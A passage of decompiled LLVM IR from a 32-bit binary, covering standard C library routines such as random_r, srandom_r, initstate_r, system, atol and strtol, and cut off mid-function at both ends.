  %v5_805392e = mul i32 %v3_805392e, 1103515245
  %v1_8053934 = add i32 %v5_805392e, 12345
  %v1_8053939 = urem i32 %v1_8053934, -2147483648
  store i32 %v1_8053939, i32* %eax.global-to-local, align 4
  store i32 %v1_8053939, i32* %v2_805392e, align 4
  %v0_8053940 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053940 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053940 = inttoptr i32 %v1_8053940 to i32*
  store i32 %v0_8053940, i32* %v2_8053940, align 4
  br label %dec_label_pc_8053970

dec_label_pc_8053945:                             ; preds = %entry
  %v1_8053945 = add i32 %tmp3, 4
  %v2_8053945 = inttoptr i32 %v1_8053945 to i32*
  %v3_8053945 = load i32, i32* %v2_8053945, align 4
  store i32 %v3_8053945, i32* @ecx, align 4
  %v2_8053948 = load i32, i32* %arg1, align 4
  store i32 %v2_8053948, i32* %edx.global-to-local, align 4
  %v1_805394a = add i32 %tmp3, 24
  %v2_805394a = inttoptr i32 %v1_805394a to i32*
  %v3_805394a = load i32, i32* %v2_805394a, align 4
  store i32 %v3_805394a, i32* %edi.global-to-local, align 4
  %v1_805394d = inttoptr i32 %v3_8053945 to i32*
  %v2_805394d = load i32, i32* %v1_805394d, align 4
  store i32 %v2_805394d, i32* %eax.global-to-local, align 4
  %v1_805394f = inttoptr i32 %v2_8053948 to i32*
  %v2_805394f = load i32, i32* %v1_805394f, align 4
  %v4_805394f = add i32 %v2_805394f, %v2_805394d
  store i32 %v4_805394f, i32* %v1_805394f, align 4
  %v0_8053951 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053951 = inttoptr i32 %v0_8053951 to i32*
  %v2_8053951 = load i32, i32* %v1_8053951, align 4
  %v1_8053953 = add i32 %v0_8053951, 4
  store i32 %v1_8053953, i32* %edx.global-to-local, align 4
  %v2_8053956 = udiv i32 %v2_8053951, 2
  %v1_8053958 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053958 = icmp ult i32 %v1_8053953, %v1_8053958
  %v1_805395a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805395a = inttoptr i32 %v1_805395a to i32*
  store i32 %v2_8053956, i32* %v2_805395a, align 4
  %v0_805395d = load i32, i32* @ecx, align 4
  %v1_805395d = add i32 %v0_805395d, 4
  store i32 %v1_805395d, i32* %eax.global-to-local, align 4
  br i1 %v7_8053958, label %dec_label_pc_8053966, label %dec_label_pc_8053962

dec_label_pc_8053962:                             ; preds = %dec_label_pc_8053945
  %v0_8053962 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8053962, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805396b

dec_label_pc_8053966:                             ; preds = %dec_label_pc_8053945
  %v1_8053966 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053966 = icmp ult i32 %v1_805395d, %v1_8053966
  %v1_8053968 = icmp eq i1 %v7_8053966, false
  %v3_8053968 = load i32, i32* %esi.global-to-local, align 4
  %v4_8053968 = select i1 %v1_8053968, i32 %v3_8053968, i32 %v1_805395d
  store i32 %v4_8053968, i32* %eax.global-to-local, align 4
  %v0_805396b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805396b

dec_label_pc_805396b:                             ; preds = %dec_label_pc_8053962, %dec_label_pc_8053966
  %v0_805396b = phi i32 [ %v0_8053962, %dec_label_pc_8053962 ], [ %v0_805396b.pre, %dec_label_pc_8053966 ]
  %v1_805396b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805396b = inttoptr i32 %v1_805396b to i32*
  store i32 %v0_805396b, i32* %v2_805396b, align 4
  %v0_805396d = load i32, i32* %eax.global-to-local, align 4
  %v1_805396d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805396d = add i32 %v1_805396d, 4
  %v3_805396d = inttoptr i32 %v2_805396d to i32*
  store i32 %v0_805396d, i32* %v3_805396d, align 4
  br label %dec_label_pc_8053970

dec_label_pc_8053970:                             ; preds = %dec_label_pc_805392e, %dec_label_pc_805396b
  %v2_8053970 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053970, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053939, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053970, { 1, 0 }
  uselistorder label %dec_label_pc_805396b, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8053977 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805397b = load i32, i32* @edi, align 4
  %v0_805397c = load i32, i32* @esi, align 4
  %v0_805397d = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8053989 = add i32 %tmp14, 12
  %v2_8053989 = inttoptr i32 %v1_8053989 to i32*
  %v3_8053989 = load i32, i32* %v2_8053989, align 4
  store i32 %v3_8053989, i32* %ecx.global-to-local, align 4
  %v6_805398f = icmp ugt i32 %v3_8053989, 4
  br i1 %v6_805398f, label %dec_label_pc_8053a09, label %dec_label_pc_8053991

dec_label_pc_8053991:                             ; preds = %entry
  %v1_8053991 = add i32 %tmp14, 8
  %v2_8053991 = inttoptr i32 %v1_8053991 to i32*
  %v3_8053991 = load i32, i32* %v2_8053991, align 4
  store i32 %v3_8053991, i32* %ebx.global-to-local, align 4
  %v1_8053994 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_805399b = select i1 %v1_8053994, i32 1, i32 %arg1
  store i32 %v3_805399b, i32* %edx.global-to-local, align 4
  %v1_805399e = icmp eq i32 %v3_8053989, 0
  %v2_80539a0 = inttoptr i32 %v3_8053991 to i32*
  store i32 %v3_805399b, i32* %v2_80539a0, align 4
  br i1 %v1_805399e, label %dec_label_pc_8053a07, label %dec_label_pc_80539a4

dec_label_pc_80539a4:                             ; preds = %dec_label_pc_8053991
  %v0_80539a4 = load i32, i32* @esi, align 4
  %v1_80539a4 = add i32 %v0_80539a4, 16
  %v2_80539a4 = inttoptr i32 %v1_80539a4 to i32*
  %v3_80539a4 = load i32, i32* %v2_80539a4, align 4
  store i32 %v3_80539a4, i32* %eax.global-to-local, align 4
  %v0_80539a7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80539a7, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_80539ae = sext i32 %v3_80539a4 to i64
  store i64 %v4_80539ae, i64* %stack_var_-40, align 8
  %v5_80539e432 = icmp sgt i32 %v3_80539a4, 1
  br i1 %v5_80539e432, label %dec_label_pc_80539b3, label %dec_label_pc_80539e6

dec_label_pc_80539b3:                             ; preds = %dec_label_pc_80539a4, %dec_label_pc_80539b3.dec_label_pc_80539b3_crit_edge
  %v0_80539db = phi i32 [ %v0_80539db.pre, %dec_label_pc_80539b3.dec_label_pc_80539b3_crit_edge ], [ %v0_80539a7, %dec_label_pc_80539a4 ]
  %v0_80539b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80539ba = ashr i32 %v0_80539b3, 31
  %v2_80539bb = zext i32 %v0_80539b3 to i64
  %v4_80539bb = zext i32 %v1_80539ba to i64
  %v5_80539bb = mul nuw i64 %v4_80539bb, 4294967296
  %v6_80539bb = or i64 %v5_80539bb, %v2_80539bb
  %v8_80539bb = sdiv i64 %v6_80539bb, 127773
  %v9_80539bb = trunc i64 %v8_80539bb to i32
  %v10_80539bb = srem i64 %v6_80539bb, 127773
  %v3_80539c1 = mul nsw i64 %v10_80539bb, 16807
  %v4_80539c1 = trunc i64 %v3_80539c1 to i32
  %tmp24 = mul i32 %v9_80539bb, -2836
  %v2_80539cd = add i32 %v4_80539c1, %tmp24
  %v1_80539cf = add i32 %v2_80539cd, 1
  %v6_80539cf = xor i32 %v2_80539cd, -2147483648
  %v7_80539cf = xor i32 %v1_80539cf, %v2_80539cd
  %v8_80539cf = and i32 %v7_80539cf, %v6_80539cf
  %v9_80539cf = icmp slt i32 %v8_80539cf, 0
  %v10_80539cf = icmp eq i32 %v1_80539cf, 0
  %v11_80539cf = icmp slt i32 %v1_80539cf, 0
  %v1_80539d2 = add i32 %v2_80539cd, 2147483647
  store i32 %v1_80539d2, i32* %eax.global-to-local, align 4
  %v3_80539d8 = icmp ne i1 %v11_80539cf, %v9_80539cf
  %v4_80539d8 = or i1 %v10_80539cf, %v3_80539d8
  %v7_80539d8 = select i1 %v4_80539d8, i32 %v1_80539d2, i32 %v2_80539cd
  store i32 %v7_80539d8, i32* %edx.global-to-local, align 4
  %v1_80539db = add i32 %v0_80539db, 4
  store i32 %v1_80539db, i32* %ecx.global-to-local, align 4
  %v2_80539de = inttoptr i32 %v1_80539db to i32*
  store i32 %v7_80539d8, i32* %v2_80539de, align 4
  %v0_80539e0 = load i32, i32* @edi, align 4
  %v1_80539e0 = add i32 %v0_80539e0, 1
  store i32 %v1_80539e0, i32* @edi, align 4
  %v3_80539e1.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_80539e1.pre to i32
  %v5_80539e4 = icmp slt i32 %v1_80539e0, %extract.t11
  br i1 %v5_80539e4, label %dec_label_pc_80539b3.dec_label_pc_80539b3_crit_edge, label %dec_label_pc_80539e1.dec_label_pc_80539e6_crit_edge

dec_label_pc_80539b3.dec_label_pc_80539b3_crit_edge: ; preds = %dec_label_pc_80539b3
  %v0_80539db.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80539b3

dec_label_pc_80539e1.dec_label_pc_80539e6_crit_edge: ; preds = %dec_label_pc_80539b3
  %v0_80539e6.pre = load i32, i32* @esi, align 4
  %v0_80539e9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80539e6

dec_label_pc_80539e6:                             ; preds = %dec_label_pc_80539e1.dec_label_pc_80539e6_crit_edge, %dec_label_pc_80539a4
  %v0_80539e9 = phi i32 [ %v0_80539e9.pre, %dec_label_pc_80539e1.dec_label_pc_80539e6_crit_edge ], [ %v0_80539a7, %dec_label_pc_80539a4 ]
  %v0_80539e6 = phi i32 [ %v0_80539e6.pre, %dec_label_pc_80539e1.dec_label_pc_80539e6_crit_edge ], [ %v0_80539a4, %dec_label_pc_80539a4 ]
  %v1_80539e6 = add i32 %v0_80539e6, 20
  %v2_80539e6 = inttoptr i32 %v1_80539e6 to i32*
  %v3_80539e6 = load i32, i32* %v2_80539e6, align 4
  store i32 %v3_80539e6, i32* %eax.global-to-local, align 4
  %v2_80539e9 = add i32 %v0_80539e6, 4
  %v3_80539e9 = inttoptr i32 %v2_80539e9 to i32*
  store i32 %v0_80539e9, i32* %v3_80539e9, align 4
  %v0_80539ec = load i32, i32* %ebx.global-to-local, align 4
  %v1_80539ec = load i32, i32* %eax.global-to-local, align 4
  %v2_80539ec = mul i32 %v1_80539ec, 4
  %v3_80539ec = add i32 %v2_80539ec, %v0_80539ec
  store i32 %v3_80539ec, i32* %eax.global-to-local, align 4
  %v1_80539ef = load i32, i32* @esi, align 4
  %v2_80539ef = inttoptr i32 %v1_80539ef to i32*
  store i32 %v3_80539ec, i32* %v2_80539ef, align 4
  %v3_80539f1 = load i64, i64* %stack_var_-40, align 8
  %v6_80539f1 = mul nsw i64 %v3_80539f1, 10
  %v7_80539f1 = trunc i64 %v6_80539f1 to i32
  %v2_80539f7 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8053a0425 = add i32 %v7_80539f1, -1
  %v9_8053a0429 = icmp slt i32 %v1_8053a0425, 0
  store i32 %v1_8053a0425, i32* @ebx, align 4
  %v1_8053a0530 = icmp eq i1 %v9_8053a0429, false
  br i1 %v1_8053a0530, label %dec_label_pc_80539f7, label %dec_label_pc_8053a07

dec_label_pc_80539f7:                             ; preds = %dec_label_pc_80539e6, %dec_label_pc_80539f7
  store i32 %v2_80539f7, i32* %eax.global-to-local, align 4
  %v0_80539fc = load i32, i32* @esi, align 4
  %v2_80539fd = inttoptr i32 %v0_80539fc to i32*
  %v3_80539fd = call i32 @__GI_random_r(i32* %v2_80539fd, i32 %v2_80539f7)
  store i32 %v0_80539fc, i32* %eax.global-to-local, align 4
  store i32 %v2_80539f7, i32* %edx.global-to-local, align 4
  %v0_8053a04.pre = load i32, i32* @ebx, align 4
  %v1_8053a04 = add i32 %v0_8053a04.pre, -1
  %v9_8053a04 = icmp slt i32 %v1_8053a04, 0
  store i32 %v1_8053a04, i32* @ebx, align 4
  %v1_8053a05 = icmp eq i1 %v9_8053a04, false
  br i1 %v1_8053a05, label %dec_label_pc_80539f7, label %dec_label_pc_8053a07

dec_label_pc_8053a07:                             ; preds = %dec_label_pc_80539e6, %dec_label_pc_80539f7, %dec_label_pc_8053991
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a09

dec_label_pc_8053a09:                             ; preds = %entry, %dec_label_pc_8053a07
  %v0_8053a10 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8053a07 ]
  store i32 %v0_805397d, i32* @ebx, align 4
  store i32 %v0_805397c, i32* @esi, align 4
  store i32 %v0_805397b, i32* @edi, align 4
  store i32 %v0_8053977, i32* @ebp, align 4
  ret i32 %v0_8053a10

; uselistorder directives
  uselistorder i32 %v1_8053a04, { 1, 0 }
  uselistorder i32 %v0_80539e6, { 1, 0 }
  uselistorder i32 %v1_80539cf, { 2, 1, 0 }
  uselistorder i32 %v2_80539cd, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_80539a7, { 1, 0, 2 }
  uselistorder i32 %v3_8053989, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8053a09, { 1, 0 }
  uselistorder label %dec_label_pc_8053a07, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80539f7, { 1, 0 }
  uselistorder label %dec_label_pc_80539b3, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8053a11 = load i32, i32* @ebp, align 4
  %v0_8053a12 = load i32, i32* @edi, align 4
  %v0_8053a14 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8053a35, label %dec_label_pc_8053a29

dec_label_pc_8053a29:                             ; preds = %entry
  %v2_8053a29 = icmp ult i32 %arg3, 256
  %v1_8053a30 = select i1 %v2_8053a29, i32 5, i32 4
  store i32 %v1_8053a30, i32* @ebx, align 4
  br label %dec_label_pc_8053a4b

dec_label_pc_8053a35:                             ; preds = %entry
  %v6_8053a38 = icmp ugt i32 %arg3, 31
  br i1 %v6_8053a38, label %dec_label_pc_8053a43, label %dec_label_pc_8053a3a

dec_label_pc_8053a3a:                             ; preds = %dec_label_pc_8053a35
  store i32 0, i32* @ebx, align 4
  %v6_8053a3f = icmp ugt i32 %arg3, 7
  br i1 %v6_8053a3f, label %dec_label_pc_8053a4b, label %dec_label_pc_8053a9b

dec_label_pc_8053a43:                             ; preds = %dec_label_pc_8053a35
  %v2_8053a43 = icmp ult i32 %arg3, 64
  %v1_8053a48 = select i1 %v2_8053a43, i32 3, i32 2
  store i32 %v1_8053a48, i32* @ebx, align 4
  br label %dec_label_pc_8053a4b

dec_label_pc_8053a4b:                             ; preds = %dec_label_pc_8053a3a, %dec_label_pc_8053a29, %dec_label_pc_8053a43
  %v0_8053a55 = phi i32 [ 0, %dec_label_pc_8053a3a ], [ %v1_8053a30, %dec_label_pc_8053a29 ], [ %v1_8053a48, %dec_label_pc_8053a43 ]
  %v1_8053a4b = mul nuw nsw i32 %v0_8053a55, 4
  %v2_8053a4b = add i32 %v1_8053a4b, ptrtoint (i32* @global_var_805c4f4.261 to i32)
  %v3_8053a4b = inttoptr i32 %v2_8053a4b to i32*
  %v4_8053a4b = load i32, i32* %v3_8053a4b, align 4
  store i32 %v4_8053a4b, i32* %eax.global-to-local, align 4
  %v1_8053a52 = add i32 %tmp7, 4
  store i32 %v1_8053a52, i32* @esi, align 4
  %v2_8053a55 = add i32 %v1_8053a4b, ptrtoint (i32* @global_var_805c4e0.262 to i32)
  %v3_8053a55 = inttoptr i32 %v2_8053a55 to i32*
  %v4_8053a55 = load i32, i32* %v3_8053a55, align 4
  store i32 %v4_8053a55, i32* %edx.global-to-local, align 4
  %v2_8053a5c = add i32 %arg4, 12
  %v3_8053a5c = inttoptr i32 %v2_8053a5c to i32*
  store i32 %v0_8053a55, i32* %v3_8053a5c, align 4
  %v0_8053a5f = load i32, i32* @esi, align 4
  %v1_8053a5f = load i32, i32* @edi, align 4
  %v2_8053a5f = add i32 %v1_8053a5f, 8
  %v3_8053a5f = inttoptr i32 %v2_8053a5f to i32*
  store i32 %v0_8053a5f, i32* %v3_8053a5f, align 4
  %v0_8053a62 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a62 = load i32, i32* @edi, align 4
  %v2_8053a62 = add i32 %v1_8053a62, 16
  %v3_8053a62 = inttoptr i32 %v2_8053a62 to i32*
  store i32 %v0_8053a62, i32* %v3_8053a62, align 4
  %v0_8053a65 = load i32, i32* @esi, align 4
  %v1_8053a65 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a65 = mul i32 %v1_8053a65, 4
  %v3_8053a65 = add i32 %v2_8053a65, %v0_8053a65
  store i32 %v3_8053a65, i32* %eax.global-to-local, align 4
  %v0_8053a68 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053a68 = load i32, i32* @edi, align 4
  %v2_8053a68 = add i32 %v1_8053a68, 20
  %v3_8053a68 = inttoptr i32 %v2_8053a68 to i32*
  store i32 %v0_8053a68, i32* %v3_8053a68, align 4
  %v0_8053a6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a6b = load i32, i32* @edi, align 4
  %v2_8053a6b = add i32 %v1_8053a6b, 24
  %v3_8053a6b = inttoptr i32 %v2_8053a6b to i32*
  store i32 %v0_8053a6b, i32* %v3_8053a6b, align 4
  %v0_8053a6e = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8053a73 = inttoptr i32 %v0_8053a6e to i32*
  %v3_8053a73 = call i32 @srandom_r(i32 %arg1, i32* %v2_8053a73)
  %v0_8053a78 = load i32, i32* @ebp, align 4
  %v1_8053a78 = inttoptr i32 %v0_8053a78 to i32*
  store i32 0, i32* %v1_8053a78, align 4
  %v2_8053a7f = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_8053a7f, i32* @ecx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053a83 = load i32, i32* @ebx, align 4
  %v1_8053a83 = icmp eq i32 %v0_8053a83, 0
  br i1 %v1_8053a83, label %dec_label_pc_8053ab4, label %dec_label_pc_8053a87

dec_label_pc_8053a87:                             ; preds = %dec_label_pc_8053a4b
  %v0_8053a87 = load i32, i32* @edi, align 4
  %v1_8053a87 = add i32 %v0_8053a87, 4
  %v2_8053a87 = inttoptr i32 %v1_8053a87 to i32*
  %v3_8053a87 = load i32, i32* %v2_8053a87, align 4
  %v1_8053a8a = load i32, i32* @esi, align 4
  %v2_8053a8a = sub i32 %v3_8053a87, %v1_8053a8a
  %v2_8053a8c = sdiv i32 %v2_8053a8a, 4
  %v3_8053a8f = mul i32 %v2_8053a8c, 5
  %v2_8053a92 = add i32 %v3_8053a8f, %v0_8053a83
  %v1_8053a94 = load i32, i32* @ebp, align 4
  %v2_8053a94 = inttoptr i32 %v1_8053a94 to i32*
  store i32 %v2_8053a92, i32* %v2_8053a94, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ab4

dec_label_pc_8053a9b:                             ; preds = %dec_label_pc_8053a3a
  %v1_8053a9b = call i32 @__errno_location(i32 %v0_8053a14)
  store i32 %v1_8053a9b, i32* %eax.global-to-local, align 4
  %v1_8053aa0 = inttoptr i32 %v1_8053a9b to i32*
  store i32 22, i32* %v1_8053aa0, align 4
  %v0_8053aa6 = load i32, i32* %stack_var_-36, align 4
  %v1_8053aa6 = call i32 @__errno_location(i32 %v0_8053aa6)
  %v1_8053aab = inttoptr i32 %v1_8053aa6 to i32*
  store i32 22, i32* %v1_8053aab, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ab4

dec_label_pc_8053ab4:                             ; preds = %dec_label_pc_8053a4b, %dec_label_pc_8053a87, %dec_label_pc_8053a9b
  %v0_8053abb = phi i32 [ 0, %dec_label_pc_8053a4b ], [ 0, %dec_label_pc_8053a87 ], [ -1, %dec_label_pc_8053a9b ]
  store i32 %v0_8053a14, i32* @ebx, align 4
  store i32 %v0_8053a12, i32* @edi, align 4
  store i32 %v0_8053a11, i32* @ebp, align 4
  ret i32 %v0_8053abb

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053ab4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053a4b, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8053ac5 = icmp eq i32 %arg1, 0
  br i1 %v4_8053ac5, label %dec_label_pc_8053be8, label %dec_label_pc_8053ad0

dec_label_pc_8053ad0:                             ; preds = %entry
  %v2_8053ad6 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053ae5 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8053af4 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8053afd = call i32 @__vfork(i32 %v2_8053af4)
  %v2_8053b05 = icmp slt i32 %v1_8053afd, 0
  store i32 %v1_8053afd, i32* @ebx, align 4
  %v2_8053b0a = icmp eq i1 %v2_8053b05, false
  br i1 %v2_8053b0a, label %dec_label_pc_8053b3b, label %dec_label_pc_8053b0c

dec_label_pc_8053b0c:                             ; preds = %dec_label_pc_8053ad0
  %v2_8053b14 = call i32 @__bsd_signal(i32 3, i32 %v2_8053ad6)
  store i32 %v2_8053ad6, i32* @edx, align 4
  %v2_8053b21 = call i32 @__bsd_signal(i32 2, i32 %v2_8053ae5)
  store i32 2, i32* @ebx, align 4
  %v2_8053b2e = call i32 @__bsd_signal(i32 17, i32 %v2_8053af4)
  br label %dec_label_pc_8053be5

dec_label_pc_8053b3b:                             ; preds = %dec_label_pc_8053ad0
  %v1_8053b05 = icmp eq i32 %v1_8053afd, 0
  %v1_8053b3b = icmp eq i1 %v1_8053b05, false
  br i1 %v1_8053b3b, label %dec_label_pc_8053b87, label %dec_label_pc_8053b3d

dec_label_pc_8053b3d:                             ; preds = %dec_label_pc_8053b3b
  %v2_8053b43 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8053b4e = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8053b59 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8053b78 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805b8a3.210 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b8a8.209 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b8a0.208 to i32), i32 %arg1, i32 0)
  %v1_8053b82 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8053b87:                             ; preds = %dec_label_pc_8053b3b
  %v2_8053b8d = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053b98 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8053b9d = ptrtoint i32* %stack_var_-8 to i32
  %v0_8053ba6 = load i32, i32* @ebx, align 4
  %v7_8053ba7 = call i32 @wait4(i32 %v0_8053ba6, i32 %v2_8053b9d, i32 0, i32 0)
  %v8_8053bb2 = icmp eq i32 %v7_8053ba7, -1
  %v1_8053bb3 = icmp eq i1 %v8_8053bb2, false
  %v6_8053bb3 = load i32, i32* %stack_var_-8, align 4
  %v7_8053bb3 = select i1 %v1_8053bb3, i32 %v6_8053bb3, i32 -1
  store i32 %v7_8053bb3, i32* @edx, align 4
  store i32 %v7_8053bb3, i32* %stack_var_-8, align 4
  %v2_8053bc2 = call i32 @__bsd_signal(i32 3, i32 %v2_8053ad6)
  store i32 3, i32* @ecx, align 4
  store i32 %v2_8053ad6, i32* @ebx, align 4
  %v2_8053bcf = call i32 @__bsd_signal(i32 2, i32 %v2_8053ae5)
  store i32 %v2_8053ae5, i32* @edx, align 4
  %v2_8053bdc = call i32 @__bsd_signal(i32 17, i32 %v2_8053af4)
  %v3_8053be1 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053be5

dec_label_pc_8053be5:                             ; preds = %dec_label_pc_8053b0c, %dec_label_pc_8053b87
  %storemerge = phi i32 [ -1, %dec_label_pc_8053b0c ], [ %v3_8053be1, %dec_label_pc_8053b87 ]
  br label %dec_label_pc_8053be8

dec_label_pc_8053be8:                             ; preds = %entry, %dec_label_pc_8053be5
  %v0_8053bec = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8053be5 ]
  ret i32 %v0_8053bec

; uselistorder directives
  uselistorder i32 %v1_8053afd, { 2, 0, 1 }
  uselistorder i32 %v2_8053af4, { 1, 0, 2 }
  uselistorder i32 %v2_8053ae5, { 0, 2, 1 }
  uselistorder i32 %v2_8053ad6, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 0, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053be8, { 1, 0 }
  uselistorder label %dec_label_pc_8053be5, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8053bfb = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8053bfb
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8053c15 = inttoptr i32 %arg1 to i8*
  %v5_8053c15 = call i32 @_stdlib_strto_l(i8* %v4_8053c15, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8053c15
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053c23 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c23, i32* %stack_var_-16, align 4
  %v4_8053c27 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053c27, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8053c2f = load i32, i32* @global_var_8062dc0, align 64
  store i32 %v0_8053c2f, i32* %edx.global-to-local, align 4
  store i32 %v4_8053c27, i32* %ebx.global-to-local, align 4
  %v2_8053c3a40 = load i8, i8* %arg1, align 1
  %v3_8053c3a41 = sext i8 %v2_8053c3a40 to i32
  store i32 %v3_8053c3a41, i32* %eax.global-to-local, align 4
  %v2_8053c3d42 = mul nsw i32 %v3_8053c3a41, 2
  %v3_8053c3d43 = add i32 %v2_8053c3d42, %v0_8053c2f
  %v4_8053c3d44 = inttoptr i32 %v3_8053c3d43 to i8*
  %v5_8053c3d45 = load i8, i8* %v4_8053c3d44, align 1
  %v6_8053c3d46 = and i8 %v5_8053c3d45, 32
  %v7_8053c3d47 = icmp eq i8 %v6_8053c3d46, 0
  %v1_8053c4148 = icmp eq i1 %v7_8053c3d47, false
  br i1 %v1_8053c4148, label %dec_label_pc_8053c39, label %dec_label_pc_8053c43

dec_label_pc_8053c39:                             ; preds = %entry, %dec_label_pc_8053c39
  %v0_8053c3949 = phi i32 [ %v1_8053c39, %dec_label_pc_8053c39 ], [ %v4_8053c27, %entry ]
  %v1_8053c39 = add i32 %v0_8053c3949, 1
  store i32 %v1_8053c39, i32* %ebx.global-to-local, align 4
  %v1_8053c3a = inttoptr i32 %v1_8053c39 to i8*
  %v2_8053c3a = load i8, i8* %v1_8053c3a, align 1
  %v3_8053c3a = sext i8 %v2_8053c3a to i32
  store i32 %v3_8053c3a, i32* %eax.global-to-local, align 4
